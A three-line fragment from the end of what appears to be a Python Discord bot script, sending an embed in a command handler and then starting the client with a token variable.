            await ctx.send(embed=my_embed)

client.run(token)